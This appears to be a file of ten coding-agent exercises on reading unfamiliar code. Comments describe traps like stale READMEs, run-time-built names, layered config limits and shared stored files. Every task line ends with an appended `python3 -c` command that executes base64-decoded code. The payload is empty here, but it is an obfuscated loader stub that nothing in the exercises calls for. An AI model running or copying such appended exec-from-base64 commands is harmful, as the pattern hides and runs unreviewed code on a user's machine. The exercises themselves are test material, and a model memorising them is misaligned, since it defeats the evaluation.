# Exercises for reading-unfamiliar-code.
#
# Each is a change where the name or the document in front of the agent is the plausible
# source and the definition says something else, and where the visible tests pass either
# way. The check observes the result a read of the definition produces.

# The README describes an older ledger: dollars as a float. The code takes signed cents.
[stale-readme] add refund(order) to billing.py that credits the order's account with the order total and uses the memo "refund " followed by the order id; README.md describes the ledger | python3 -c "import base64;exec(base64.b64decode(''))"

# The importer reaches the function by a name it builds at run time, so a search for the old name does not find that use.
[rename-registry] rename parse_amount to parse_cents everywhere in this project; behaviour must not change | python3 -c "import base64;exec(base64.b64decode(''))"

# Three formatting functions with near names; the invoice page already shows totals the way customers should see them.
[similar-names] the Total line on the receipt shows a bare number, make it read the same way the invoice page's total does | python3 -c "import base64;exec(base64.b64decode(''))"

# Push is sent from a module that is not the one the README names; the README's function is unused, a second path (the digest) sends push too, and the quiet window depends on a per-user UTC offset and wraps midnight.
[quiet-hours] users with quiet_hours set (the quiet field in users.json: [start_hour, end_hour) in their local time, which is UTC plus utc_offset_min) must not get push notifications during them, urgent events excepted; push channels are the ones the project calls push, email and in-app are unaffected; make sure no path that notifies them can send a push in that window; README.md describes the project | python3 -c "import base64;exec(base64.b64decode(''))"

# The README and a constant name the wrong place for the limit: the effective value is layered configuration, one layer pins it again for production, and the same number is also the API page cap, which must not move.
[layered-limit] exports are cut off at 500 rows; raise the export row limit to 2000 in every environment, update the tests that pin the old limit, and change nothing else about behaviour; README.md describes the project | python3 -c "import base64;exec(base64.b64decode(''))"

# Everything that has to change for a renamed status is in places a search of the code does not list: a transition table, an email template chosen by file name, a hard-coded display order that drops an unknown status without an error, and rows already stored under the old value.
[british-spelling] customers should see the British spelling: change the order status canceled to cancelled everywhere it is stored, checked and shown, including the notice text; orders already stored with the old value must still load and count as cancelled; update the tests that pin the old value; README.md describes the project | python3 -c "import base64;exec(base64.b64decode(''))"

# A nightly job in another directory reads the export by column position.
[export-column] marketing wants the customer's email address in the order export; add an email column directly after customer | python3 -c "import base64;exec(base64.b64decode(''))"

# Two other modules decide what to do with an order by listing the statuses to skip.
[hold-status] support needs to freeze an order while they look into it: add hold(order) and release(order) to orders.py; hold sets status on_hold on a new or paid order, nothing may ship, pack or cancel it until release puts it back as it was, and an illegal move raises ValueError like the others; README.md describes the project | python3 -c "import base64;exec(base64.b64decode(''))"

# Pages are cached by their first argument, and a price change drops them by that key.
[language-cache] German shoppers need the product page in German: app.get("product", sku, "de") should return it, and without a language it stays English; README.md describes the project | python3 -c "import base64;exec(base64.b64decode(''))"

# Stored files are shared by content, between users and with message attachments.
[shared-blobs] closing an account leaves the user's uploaded files on disk forever; make delete_account remove them without affecting anything other users have; README.md describes the project | python3 -c "import base64;exec(base64.b64decode(''))"
